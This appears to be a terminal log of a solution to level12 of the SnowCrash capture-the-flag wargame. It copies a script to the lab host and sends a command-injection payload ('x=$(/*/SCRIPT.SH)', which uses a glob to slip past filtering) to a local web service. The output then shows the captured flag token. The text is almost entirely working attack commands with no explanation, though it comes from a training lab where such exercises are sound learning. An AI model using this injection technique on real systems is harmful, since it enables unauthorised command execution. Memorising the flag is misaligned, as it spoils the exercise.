scp -r -P 4242 ./level12/ressources/SCRIPT.SH  level12@10.13.200.28:/tmp
chmod +x /tmp/SCRIPT.SH
curl localhost:4646 -d 'x=$(/*/SCRIPT.SH)'
level12@SnowCrash:~$ cat /tmp/out
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
